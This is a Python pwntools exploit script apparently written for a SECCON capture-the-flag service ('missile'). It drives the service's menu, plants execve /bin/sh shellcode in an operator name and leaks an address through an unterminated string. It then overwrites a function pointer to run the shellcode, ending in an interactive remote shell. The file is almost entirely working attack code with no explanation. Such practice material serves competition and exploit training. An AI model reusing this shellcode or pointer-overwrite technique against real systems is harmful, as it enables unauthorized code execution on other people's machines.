#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.28"
#port = 8888
host = "missile.pwn.seccon.jp"
port = 9999

r = remote(host,port)

def addop(name,part,rank):
    r.recvuntil("Command :")
    r.sendline("3")
    r.recvuntil("Command :")
    r.sendline("2")
    r.recvuntil("Operator Name :")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(part)
    r.recvuntil(":")
    r.sendline(rank)
    r.recvuntil("Command :")
    r.sendline("4")

def addmis(op,name,loc):
    r.recvuntil("Command :")
    r.sendline("2")
    r.recvuntil("Command :")
    r.sendline("2")
    r.recvuntil("Add Operator number :")
    r.sendline(str(op))
    r.recvuntil(":")
    r.sendline(name)

def mislist():
    r.recvuntil("Command :")
    r.sendline("1")

def misret():
    r.recvuntil("Command :")
    r.sendline("5")

def delfunc(idx):
    r.recvuntil("Command :")
    r.sendline("4")
    r.recvuntil("Command :")
    r.sendline("2")
    r.recvuntil("Function Number :")
    r.sendline(str(idx))
    
def addfunc(op,name,reason):
    r.recvuntil("Command :")
    r.sendline("3")
    r.recvuntil("Add Operator number :")
    r.sendline(str(op))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(reason)

def modifyfunc(idx,data):
    r.recvuntil("Command :")
    r.sendline("1")
    r.recvuntil("Function Number :")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(data)

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
addop(sc,"nogg","fuck")
addmis(0,"a"*56,"d")
mislist()
r.recvuntil("a"*56)
addr = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x14
print "addr:",hex(addr)
misret()
delfunc(1)
addfunc(0,"a"*0x20 + p64(0x4628e7)[:3],"fuck")
modifyfunc(1,p64(addr))
r.recvuntil(":")
r.sendline("5")
r.recvuntil(":")
r.sendline("1")
r.interactive()
